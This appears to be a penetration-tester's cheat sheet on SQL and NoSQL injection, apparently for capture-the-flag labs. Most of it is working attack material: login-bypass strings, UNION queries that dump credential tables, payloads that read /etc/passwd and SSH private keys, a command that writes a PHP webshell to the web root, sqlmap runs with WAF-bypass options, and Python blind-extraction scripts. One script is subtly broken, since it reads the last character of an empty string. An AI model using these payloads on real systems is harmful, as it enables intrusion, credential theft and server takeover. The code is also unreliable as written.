---
description: >-
  Most modern web applications rely on a database architecture in the back-end
  to manage their data. These databases store and retrieve various types of
  information essential to the application.
---

# SQL

MySQL

```bash
# Connect to database
mysql -u root -h 127.0.0.1 -P 3306 -p

# Show all columns
SELECT * FROM table_name

# Show specific column
SELECT column1, column2 FROM table_name

# Result based on string
SELECT * FROM logins WHERE username LIKE 'admin%'

# SQL query from CLI
mysql --host=db --user=root --password=root database -e "show tables"

# SQL query from CLI
mysql -h db -u root -proot database -e 'show tables;'
```

#### MySQL Authenication Bypass

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

```bash
# Basic bypass
admin' or '1'='1

# Basic bypass with comments
admin')-- -
```

#### Union injection

```bash
# Check number of columns
' order by 1-- -
cn' UNION select 1,2,3-- -

# Basic union injection
cn' UNION select 1,@@version,3,4-- -

# Union injection 4 columns
UNION select username, 2, 3, 4 from passwords-- -
```

#### SQLMap

```bash
# Run SQLmap with data parameter
sqlmap -u http://zencorp.com/book --method POST --data "date=2024-10-17" --batch

# Force SSL
sqlmap -r request --risk=3 --level=3 --batch --force-ssl

# Basic auth and WAF bypass
sqlmap -u 'http://10.10.10.10/login' --form --dbs --batch --level 4 --risk 3 --dbms=mssql --headers="Authorization: Basic c3ZjX2lpczpWaW50YWdlIQ==" --tamper=charencode --technique S
```

#### SQL injection in SOAP using WSDLer

```
# Use burp extension WSDLer to parse document
# Intercept request and run sqlmap

sqlmap -r request --batch --dbs
```

#### Enumeration

<pre class="language-bash"><code class="lang-bash"># Fingerprint 
SELECT @@version

# Sleep command
SELECT SLEEP(5)

# Database name
cn' UNION select 1,database(),2,3-- -

<strong># List all database
</strong>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

# List all columns
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

# Dump data
cn' UNION select 1, username, password, 4 from dev.credentials-- -
</code></pre>

#### File injection

<pre class="language-bash"><code class="lang-bash"># Read local file
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

# Write string to file
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

# Write webshell 
cn' union select "",'&#x3C;?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

# Read file
SELECT CAST(FILE_READ('/home/zen/user.txt') AS VARCHAR;
CALL+REVEXEC('cat /home/zen/.ssh/id_rsa')%3B

<strong># Boolean check, this will always be true. 
</strong>test' or 1=1;-- -  
</code></pre>

#### Websocket

```bash
sqlmap -u ws://urlhere.dev:9091
sqlmap -u ws://urlhere.dev:9091 --data '{"id": "1234"}' --dbms mysql --batch --lev
```

#### NoSQL Auth bypass

```bash
# URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

# Using json (change contenttype to application/json)
{"user": "admin", "password": {"$ne": "admin"}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
```

#### NoSQL mongosh

```sql
# Connect
mongosh mongodb://127.0.0.1:27017

# Show database, select and describe
show databases
use test
show collections

# Find item
db.movies.find({type: "James Bond"})

# List documents
db.movies.find({})

# Filter on first/last letter
db.accounts.find({ $and: [ { firstName: { $regex: /^R/ } }, { lastName: { $regex: /^D/ } }] });
```

#### In-Band Data Extraction

NoSQL queries we want to use will have to be formatted like `param[$op]=val` or `param[$ne]=val`.

```sql
# Example request
GET /?search[$ne]=/.*/ HTTP/1.1
```

#### Bind Data Extraction

```sql
# json payload
{"trackingNum":{"$ne":"x"}}

# wilcard
{"trackingNum":{"$regex":"^.*"}}

# Get value of number, try 1,2,3 etc
{"trackingNum":{"$regex":"^1.*"}}
```

Simple extraction script

```python
import requests
import json

# request
def oracle(t):
    r = requests.post(
        "http://94.237.59.168:33111/",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text

# Fuzz chars
trackingNum = "XYZ{"
for _ in range(32):
    for c in "0123456789abcdef":
        if oracle({"$regex": "^" + trackingNum + c}):
            trackingNum += c
            break
trackingNum += "}"

print("Tracking Number: " + trackingNum)
```

#### NoSQL injection

```bash
curl -s -X POST http://127.0.0.1:3000/api/v1/getUser -H 'Content-Type: application/json' -d '{"username": {"$regex": ".*"}}' | jq
```

the `$regex` operator can coerce the server into returning the information of all users (whose usernames match `/.*/`).

#### NoSQL using Server Side Javascript Injection

```sql
# Login with 
" || true || ""=="

# Full line
this.username === "" || true || ""=="" && this.password === "<password>"

# Blind extraction
" || (this.username.match('^a.*')) || ""=="
```

<details>

<summary>SSJI Blind script</summary>

```python
import requests
from urllib.parse import quote_plus

def get_data(r):
    global num_req
    num_req += 1

    r = requests.post(
        "http://94.237.59.180:41776",
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data="username=%s&password=x" % (quote_plus('" || (' + r + ') || ""=="'))
    )
    return "Logged in as" in r.text

# Get username regular
num_req = 0
username = ""
i = 0

while username[-1] != "}":
    for c in range(32, 128):
        if get_data('this.username.startsWith("") && this.username.charCodeAt(%d) == %d' % (i, c)):
            username += chr(c)
            break
    i += 1    

print("Username: %s" % username)
print()
```

</details>
